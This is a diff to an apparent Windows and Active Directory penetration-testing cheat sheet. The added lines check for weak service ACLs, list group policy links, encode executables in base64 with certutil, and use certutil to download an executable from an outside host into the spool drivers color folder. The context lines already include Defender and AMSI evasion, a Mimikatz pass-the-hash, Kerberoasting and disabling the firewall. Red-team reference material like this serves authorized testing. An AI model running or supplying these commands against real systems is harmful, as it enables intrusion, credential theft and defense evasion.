@@ -112,7 +112,10 @@ Automated Enumeration with PowerUp.ps1:
 PS C:\>. .\PowerUp.ps1
 PS C:\>Invoke-AllChecks 
 ```
-
+Looking for weak ACL on Services: 
+```
+accesschk64.exe -uwcqv "domain\user" 
+```
 ### AV and AMSI Evasion:
 To bypass AMSI and Defender, there is a possibility to turn them off with Local Administrator privileges:
 ```
@@ -151,6 +154,10 @@ Invoke-Mimikatz -command "sekurlsa::pth /user:Administrator /domain:MARVEL /ntlm
 ### Looking for weak ACL in domain
 ```
 Invoke-ACLScanner | Where-Object {$_.IdentityReference –eq $userName}
+```
+### Looking for hiddenb GPO:
+```
+PS>(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]"$_").gPlink){Write-Host "[+] Domain Path:"([ADSI]"$_").Path;$a=((([ADSI]"$_").gplink) -replace "[[;]" -split "]");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host "Policy Path[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host "Policy Name[$i]:"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output "`n" }}
 ```
 ### Kerberoasting
 ```
@@ -378,4 +385,13 @@ Copy-Item -ToSession $ses -Path  C:\Users\punisher\Desktop\powerup.ps1 -Destiant
 # Disable Firewall
 ```
 PS C:\Windows\system32> Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+```
+# Fast Decode and Encode base64 file
+```
+certutil -encode test.exe test.txt
+certutil -decode test.txt test.exe
+```
+# Fast File Download
+```
+certutil -split -f http://my.com c:\windows\system32\spool\drivers\color\j.exe
 ```
